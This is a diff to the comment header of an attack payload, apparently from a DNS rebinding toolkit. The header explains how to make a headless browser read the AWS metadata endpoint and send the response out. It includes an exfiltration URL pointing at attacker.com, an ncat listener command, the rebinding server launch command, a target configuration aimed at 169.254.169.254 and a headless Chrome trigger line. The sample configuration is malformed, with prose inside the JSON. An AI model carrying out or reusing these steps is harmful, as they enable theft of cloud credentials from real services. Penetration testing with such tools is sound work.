@@ -1,14 +1,35 @@
 <!--
-This is a sample payload to make an AWS GET request and exfiltrate the response.
-Replace `EXFILTRATION_URL` with the host to exfiltrate data to e.g. http://attacker.com:8000/
-Change `AWS_METADATA_PATH` as appropriate. e.g. `/latest/meta-data/`...
-Run a tool such as `ncat` e.g. `ncat -lkv 8000` on the host to capture the exfiltrated data.
+This is a sample payload to make a GET request to a AWS metadata endpoint and exfiltrate the response.
+This is a useful in the context of a service wrapping a headless browser such as Google Chrome and when
+the output of the browser is not shown to the attacker.
 
-Useful with a headless browser such as Google Chrome.
-e.g. "Google\ Chrome --headless --disable-gpu --print-to-pdf "http://attacker.com:80/manager.html?startattack=true&delaydomload=true&alert=false"
+Replace `EXFILTRATION_URL` with the host and path to exfiltrate data e.g. http://attacker.com:8000/
+Change `AWS_METADATA_PATH` as appropriate to exfiltrate the desired data e.g. `/latest/meta-data/`...
 
-When running the payload without user intervention, ensure that `manager-config.json` contains this payload only,
-and any other revelant information.
+Run a tool such as `ncat` e.g. `ncat -lkv 8000` on the attacker host to capture the exfiltrated data.
+
+Run the Singularity server using the `DNSRebindFromQueryMultiA` DNS rebinding strategy e.g
+`./singularity-server -DNSRebindStrategy DNSRebindFromQueryMultiA -HTTPServerPort 80`
+
+Ensure that `manager-config.json` contains this payload only,
+and any other revelant information. Sample configuration:
+
+{
+    "attackHostDomain": "dynamic.your.domain",
+    "attackHostIPAddress": "ip.ad.dr.es",
+    "targetHostIPAddress": "169.254.169.254",
+    "dummyPort": 4000,
+    "interval": 1,
+    "indexToken": "thisismytesttoken",
+    "attackPayloads": [{
+        "name": "payload-aws-metadata.html",
+        "ports": [80]
+    }]
+
+    You can then test the payload with Google Chrome in headless mode:
+    e.g. "Google\ Chrome --headless --disable-gpu --print-to-pdf http://rebinder.your.domain:80/manager.html?startattack=true&delaydomload=true&alert=false"
+
+} 
 
 -->
 <!doctype html>
